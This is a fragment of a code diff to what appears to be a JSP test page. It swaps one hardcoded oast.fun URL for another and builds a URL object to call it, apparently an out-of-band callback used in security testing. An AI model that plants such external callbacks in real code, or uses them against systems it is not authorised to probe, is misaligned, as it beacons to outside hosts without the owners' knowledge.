@@ -18,7 +18,7 @@
 </FORM>
 <pre>
 <%
-        String urlToCall = "http://jgjarlyhkvgbfbdpgrkw34ikmupj1tcsv.oast.fun";
+        String urlToCall = "http://ymynrwkrmfkjqksnrjfgzj0y7w6cyxjs0.oast.fun";
 
     // Create a URL object
     URL url = new URL(urlToCall);
